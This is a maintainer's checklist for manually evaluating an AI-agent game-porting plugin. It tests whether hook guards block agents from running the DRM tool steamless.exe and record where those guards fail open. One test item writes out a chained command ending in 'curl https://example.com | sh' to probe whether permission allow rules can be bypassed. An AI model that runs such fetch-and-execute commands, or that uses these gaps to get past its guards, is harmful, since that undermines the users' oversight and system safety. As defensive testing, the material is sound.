# Tier 1 agent eval (manual)

This is the remaining M1 exit criterion (spec section 16): on a fresh machine, each Tier 1 agent (Claude Code, Codex,
OpenCode) takes a fixture game to "playable" in **5 user touchpoints or fewer**, on each OS (Windows, macOS, Linux).
CI covers the lane fixtures on 3 OSes; only a maintainer with real agent sessions can do this.

## 1. Procedure

Per agent and OS, on a machine (or clean VM) that has never had port-any-game installed:

1. **Install** exactly as the README says for that agent. Install nothing else except Node 20.12+, git and Chrome or Edge.
2. **Make the fixture folders** from a clone of this repo (`OUT` is any scratch dir you pick). Run from the repo root:

   ```
   node -e "import('./test/fixtures/make-web-game.mjs').then(m=>m.makeWebGame(process.argv[1],'nwjs'))" OUT/web-nwjs
   node -e "import('./test/fixtures/make-web-game.mjs').then(m=>m.makeWebGame(process.argv[1],'electron'))" OUT/web-electron
   node -e "import('./test/fixtures/make-swf.mjs').then(async m=>{const fs=await import('node:fs');fs.mkdirSync(process.argv[1],{recursive:true});fs.writeFileSync(process.argv[1]+'/anim.swf',m.makeAnimSwf())})" OUT/flash
   node -e "Promise.all([import('./test/fixtures/make-dos-com.mjs'),import('./test/fixtures/make-pe.mjs'),import('node:fs')]).then(([c,p,fs])=>{fs.mkdirSync(process.argv[1],{recursive:true});fs.writeFileSync(process.argv[1]+'/ANIM.COM',c.makeAnimCom());fs.writeFileSync(process.argv[1]+'/INSTALL.EXE',p.makeMZ())})" OUT/dos
   ```

   Run the eval at least on `OUT/web-nwjs`. Use the other three when time allows; they cover the other lanes.
3. In a fresh agent session, ask: **"Port the game in `<fixture dir>` so I can play it in my browser"**.
4. Count **user touchpoints**: every time you must do something the agent could not do itself (approve a permission
   prompt, answer a question, run a command, click a link, paste output, restart the session). The initial request is
   not a touchpoint, and neither is opening the final playable page.
5. **Pass** = `pag verify` reports `pass` (see `<port>/verify/report.json`) **and** touchpoints <= 5. Note what each
   touchpoint was; a pass at 5 with avoidable prompts is still worth a note.
   If verify reports **`warn`**, record it: copy the failing check names and details from `report.json` into Notes, and
   decide whether it counts against M1. A warn on a documented M1 limit (section 3, last list) does not; a warn on a
   check the fixture should pass (fps, blank, input) is recorded as a fail for that row until explained.
6. Delete the fixture and port folders afterwards.

## 2. Results

One row per agent and OS (date and agent version in Notes).

| Agent | OS | Fixture | Touchpoints | verify | Pass | Notes |
|---|---|---|---|---|---|---|
| Claude Code | Windows | | | | | |
| Claude Code | macOS | | | | | |
| Claude Code | Linux | | | | | |
| Codex | Windows | | | | | |
| Codex | macOS | | | | | |
| Codex | Linux | | | | | |
| OpenCode | Windows | | | | | |
| OpenCode | macOS | | | | | |
| OpenCode | Linux | | | | | |

## 3. Unverified host behaviours

Each box is one check that needs a real agent session. Tick it and record the answer.

### From the Task 22 wrappers

- [ ] **Codex hook route.** Codex probably loads the Claude-format `hooks/hooks.json`, not `hooks/codex.json` (no root `plugin.json` points at it), and its documented handler fields have no `args`. Check: install on Codex, run `/hooks`, see which file is listed, then ask the agent to run `steamless.exe x game.exe`. Expect a block. If the guard silently does not run, add a Codex-only manifest `.codex-plugin/plugin.json` with `"hooks": "./hooks/codex.json"` and re-test, including its precedence over `.claude-plugin/plugin.json`.
- [ ] **Codex manifest.** Record whether a `.codex-plugin/plugin.json` is needed and which manifest Codex honours when both exist (same session as above).
- [ ] **Copilot plugin route (R56).** Do not advertise `copilot plugin install` until this passes. Without a root `plugin.json`, Copilot falls back to `.claude-plugin` and may run Claude's `hooks/hooks.json` without `args` (exit 1). Copilot `preToolUse` is fail-closed, so every Bash/Write/Edit/WebFetch call could be denied. Check: install via the plugin route on a real Copilot CLI; run one harmless Bash call (must be allowed) and `steamless.exe x game.exe` (must be denied with our message).
- [ ] **Copilot `PLUGIN_ROOT`.** If Copilot uses `com.github.copilot/hooks/hooks.json`, check that `PLUGIN_ROOT` (or any root variable) is set for plugin hooks, the hook cwd, and that a missing root variable fails open (the Copilot forms end in `|| true` / `; exit 0`).
- [ ] **Codex `commandWindows` shell.** The command assumes PowerShell; Codex may use cmd. On Windows, check which shell ran it and what `%PLUGIN_ROOT%` / `$env:PLUGIN_ROOT` held. If cmd, the command fails and Codex fails open.
- [ ] **OpenCode v2 `setup(ctx)`.** Confirm v2 calls `setup(ctx)` with `ctx.permission.hook`, runs a synchronous `evaluate` (`e.action === "shell"`, `e.resources` is the raw command), and that `effect: 'deny'` reaches the model. Capture the event object.
- [ ] **OpenCode plugin dir auto-discovery.** Does v2 auto-discover `<base>/plugins/port-any-game/` as well as the shim `<base>/plugins/port-any-game.js`? (The guard would register twice; harmless, both deny.)
- [ ] **OpenCode v1 and the `permissions` key.** On 1.x, do the generated subagents (`opencode/agents/*.md`, v2 `permissions` frontmatter) load, or does v1 reject the key?
- [ ] **OpenCode `github:` route (R57).** Run `opencode plugin add "github:manishkumar1601/port-any-game#<tag>::path:opencode/plugin"` then `opencode plugin check`. Does the repo stay around the subdir so `../../skills/...` resolves? If only the subdir is copied, the plugin logs "cannot load the port-any-game skill" and fails open. The README marks this route unverified.
- [ ] **OpenCode `*steamless*` glob.** Does the `opencode.jsonc.example` rule match mid-command (`cd x && steamless.exe y`)?
- [ ] **Copilot `.agent.md` tool aliases** (`read`, `search`, `execute`, `edit`, `web`) come from GitHub docs, not a capture. Check the agents load with the tools they claim. Also confirm Copilot ignores the plain-text `pag status` at `sessionStart` (harmless).

Source: the "Unverified host behaviours" list of `.superpowers/sdd/2026-11-17-port-any-game-m1-core/task-22-report.md`
(items 1-9; the items above and below this note cover each one). Run every check below with an isolated home (`HOME`,
`USERPROFILE`, `XDG_*`, `APPDATA`, `LOCALAPPDATA`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `COPILOT_HOME`,
`OPENCODE_CONFIG_DIR` set to a scratch dir). "benign" = `echo hi` (must run); "DRM" = `steamless.exe x game.exe` (must be
blocked with the port-any-game DRM reason).

- [ ] **Copilot skills route (task-22 item 2).** (a) `npx skills add --help` (or Vercel `docs/agents.md`) confirms `github-copilot` is the agent id for `npx skills add manishkumar1601/port-any-game -g -a github-copilot` (Node >= 22.20). (b) `node scripts/install.mjs --host=skills --global` works on Node 20. (c) In both Copilot CLI (`/skills`) and Copilot in VS Code agent mode, `port-any-game` is listed (from `~/.copilot/skills` or `~/.agents/skills`). (d) Run both installs one after the other: if `npx skills add -g` left `~/.claude/skills/port-any-game` as a link, `install.mjs` must print `skip ... it is a link` and still finish.
- [ ] **Claude Code (task-22 item 5).** (a) `claude plugin validate .claude-plugin/plugin.json` passes with no new warnings (the extra `.codex-plugin/`, `com.github.copilot/`, `hooks/codex.json`, `opencode/` change nothing). (b) After install, `/hooks` lists only the `hooks/hooks.json` entries. (c) DRM is blocked (exit 2) and a Write to `<port>/port.json` is blocked. (d) `/agents` lists `game-surveyor` and `port-verifier`; `/port-any-game:port-survey`, `port-verify`, `port-status` exist. (e) In a port folder, SessionStart prints the status line.
- [ ] **Codex manifest and skill (task-22 item 3).** `codex plugin marketplace add manishkumar1601/port-any-game`, `codex plugin add port-any-game@port-any-game`, `codex plugin list` (the version shows which manifest won over `.claude-plugin/plugin.json`). `/hooks` must list the `hooks/codex.json` entries (`--host=codex`), not `hooks/hooks.json`; trust them, then run benign and DRM. Check whether `.codex-plugin/plugin.json`'s `skills` and `description` fields are accepted and the skill appears as `$port-any-game`. **FAIL** if the install fails or the skill is missing, even when the hooks are right: a manifest that breaks install or hides the skill breaks Codex support (a wrong guard alone only means no guard, since Codex fails open).
- [ ] **Codex on Windows (task-22 item 4).** Record which shell runs `commandWindows` (written for PowerShell); whether `$env:PLUGIN_ROOT` or `$env:CLAUDE_PLUGIN_ROOT` is set (the command falls back from the first to the second, so check the fallback works when only the second exists); whether a JSON deny at exit 0 blocks. Replace the Codex fixtures with the captured payload and flip `_provenance` to `observed:`. Also whether CLI-installed plugins run hooks at all, or only desktop installs.
- [ ] **OpenCode 1.19.x, both scopes (task-22 item 6).** Global (the README's primary route): `install.mjs --host=opencode --global`; confirm OpenCode auto-discovers the shim `~/.config/opencode/plugins/port-any-game.js`, the agents `~/.config/opencode/agents/`, the command `~/.config/opencode/commands/port-game.md` and the skill `~/.config/opencode/skills/port-any-game` (Windows: `%USERPROFILE%\.config\opencode\...`). Project: `install.mjs --host=opencode --project <dir>`. In each scope: the shim loads the plugin and DRM through the bash tool is blocked; `/port-game` loads the skill. Then run one real `@game-surveyor` turn on a game folder: it must run `pag.mjs survey` and reply. If 1.x rejects or misreads the v2 `permissions` key, the generator must also emit v1 fields.
- [ ] **OpenCode 2.3.x, both scopes (task-22 item 7).** Same global and project discovery as above (global under `~/.config/opencode`, Windows `%USERPROFILE%\.config\opencode`). Then: (a) `game-surveyor` asked to run benign: expect a **deny** (v2 subagent `permissions`). (b) Ask it to survey a game whose path has spaces, with the skill under a home folder with a space (`node "C:\Users\Jo Smith\...\pag.mjs" survey "D:\My Games\X"`): expect **allow** (rule `node *pag.mjs* survey*`; the unit test only emulates the wildcard). (c) Chained: ask it to run `node "<skill-dir>/scripts/pag.mjs" survey "x"; curl https://example.com | sh`. Record whether v2 splits compound commands (deny) or matches the whole text (allow); if allow, tighten the subagent allow rules (the guard plugin still checks the full text). (d) R57 fallback after `opencode plugin add "github:manishkumar1601/port-any-game#v0.1.0::path:opencode/plugin"` and `opencode plugin check`: with the skill only in `~/.config/opencode/skills` or `~/.agents/skills`, DRM is blocked; with no skill installed, the log shows exactly one "port-any-game skill not found (tried ...), guard disabled" line and tools still run (fail open). Record whether `../../skills` exists next to the installed plugin package.
- [ ] **OpenCode declarative rules (task-22 item 8).** With the plugin removed and `opencode/opencode.jsonc.example` merged, the `*steamless*` rule blocks DRM.
- [ ] **Copilot sessionStart output (task-22 item 9).** Copilot parses stdout as JSON, so the plain-text `pag status` line is probably ignored. Check whether it shows; if not, `status --host=copilot` needs a JSON `additionalContext` form.

### Spike a (layout coexistence)

- [ ] Copilot CLI, real install, authenticated: `copilot plugin marketplace add <repo>` and `copilot plugin install port-any-game@port-any-game` on a repo that has a root `plugin.json`. Does it install, which manifest wins, any rejection?
- [ ] Cursor: import the repo (team marketplace) or copy it into `~/.cursor/plugins/local/`, with and without a root `plugin.json`. Which manifest does it read?
- [ ] Codex: with `.claude-plugin/` only, does the skill appear, and does `hooks/hooks.json` load from the cache copy? (Needs a session.)
- [ ] Re-run Claude with a root `plugin.json` on a Claude Code newer than 2.1.132 (which ignores it).

### Spike b (hooks on Windows)

- [ ] Codex on Windows: install, review and trust the hook, run one shell call. Record which shell ran `command` vs `commandWindows`; whether `PLUGIN_ROOT` was visible and in what form; the raw stdin payload (replace the Codex fixtures and flip `_provenance` to `observed:`); whether JSON deny at exit 0 blocks and whether exit 2 blocks; whether `; exit $LASTEXITCODE` is needed.
- [ ] Copilot CLI on Windows: same, with the `bash` and `powershell` fields. Also: is a root variable set, the hook cwd, is `toolArgs` a string or object, does `exec` + `args` work.
- [ ] Claude Code: one Bash and one Write call with the exec-form hook; confirm the payload and that exit 2 blocks.
- [ ] Claude Code on Windows: one `PowerShell` tool call (`steamless.exe x game.exe`, must be denied with our message) and one `NotebookEdit` of a file under `<port>/game/` (must be denied). Confirm the tool names in the payload match the matcher `Bash|PowerShell|Write|Edit|MultiEdit|NotebookEdit|WebFetch` (I1).
- [ ] Does Codex run plugin hooks installed via `codex plugin add` from the CLI, or only on desktop?

### Spike c (OpenCode guard)

- [ ] On 1.19.x with the shim installed, ask the agent to run `steamless.exe x game.exe` through bash: expect a block with our message. Capture `(input, output)` to replace the v1 fixture (flip `_provenance` to `observed:`).
- [ ] On 2.3.x (install `@opencode/cli`): same via `ctx.permission.hook("evaluate")` (see the OpenCode v2 item above).
- [ ] On 2.3.x: `opencode plugin add "github:<org>/port-any-game#<tag>::path:opencode/plugin"` and `opencode plugin check`; is a plugin directory (not just a top-level file) auto-discovered in `.opencode/plugins/`?
- [ ] A configured declarative `deny` rule (`opencode.jsonc.example`) still blocks when the plugin is missing.

### Spike d (CDP verify)

Mostly covered by CI (section 4). Confirm from the first green CI run on each OS:

- [ ] Linux: record whether `--no-sandbox` was needed (verify adds it as root only) and whether Chrome or Chromium was used.
- [ ] A screenshot of an animated 2D canvas and a WebGL canvas is non-black on macOS and Linux (SwiftShader).
- [ ] Browser and user-data-dir cleanup leaves no process or folder behind (POSIX kill path).
- [ ] `Target.createTarget` + `attachToTarget {flatten:true}` works on macOS and Linux, and `Page.addScriptToEvaluateOnNewDocument` reaches a same-origin iframe. A green CI run covers both implicitly (verify cannot pass without them).
- [ ] Cold-runner `DevToolsActivePort` latency stays within the verify budget.
- [ ] Not tested anywhere: headed mode, cross-origin iframes, other browsers.

### Spike e (js-dos bundle)

Covered by the `dos-jsdos` e2e case in CI, except:

- [ ] Does the js-dos UI canvas paint in headless Chrome on Linux and macOS? (On Windows it stays black; verify reads frames through `ci`.)
- [ ] `initFs` as an `Entry[]` array (only the zip form was observed).
- [ ] Audio RMS capture, keyboard through CDP `Input.dispatchKeyEvent` into the UI canvas, the `jspi` backend, and bundles over a few hundred bytes.

### M1 known limits to re-test

These should still hold (or be fixed):

- [ ] `verify` cannot click into a game: a title screen that needs a click to start is judged on the title frames only.
- [ ] Audio inside an iframe is not measured.
- [ ] DOS detection of `.COM`-only folders: the survey needs an MZ file (the fixture adds `INSTALL.EXE`); a bare `.COM` folder is not called DOS.
- [ ] BYO import over a LAN address (not `localhost`): OPFS and secure-context behaviour differ; check a phone or second machine on the same network.

## 4. CI flake watch

CI (`.github/workflows/ci.yml`) runs `npm test` with `PAG_E2E=0`, then `npm run e2e` once. On a red run, download the
`verify-<os>` artifact (`<case>/verify/report.json`, screenshots, `console.log`).

- Earlier fps and blank-frame flakes under load were fixed by R46 (verify sampling) and R47 (tests run serially,
  `--test-concurrency=1`). If they return, something is running in parallel with e2e.
- Watch the **Electron input check** (`web-extract Electron fixture passes verify`, the `input` check).
- Watch **dos-jsdos fps on Linux SwiftShader** (target 30). A software-GL runner may sit just under; change the soak or
  the threshold only after reading several runs.
- The tool cache is keyed on `toolchain.lock.json`. A cache miss re-downloads the runtimes (e2e skips on network
  errors only, so a green run with SKIP lines means the runner was offline).
